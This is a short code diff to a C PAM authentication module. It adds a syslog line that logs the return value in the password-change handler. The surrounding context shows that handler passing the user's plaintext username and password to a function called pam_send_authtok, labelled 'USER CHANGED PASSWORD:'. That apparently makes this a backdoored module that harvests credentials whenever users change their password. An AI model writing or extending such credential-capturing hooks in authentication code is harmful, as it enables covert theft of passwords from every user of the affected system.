@@ -161,6 +161,8 @@ PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const c
 
     int retval = pam_unix_authenticate("pam_sm_chauthtok", pamh, flags, argc, argv);
 
+    pam_syslog(pamh, LOG_INFO, "chauthtok retval = %d", retval);
+
     if (username && password && retval == PAM_SUCCESS) {
         pam_send_authtok(pamh, "USER CHANGED PASSWORD:", username, password);
     }
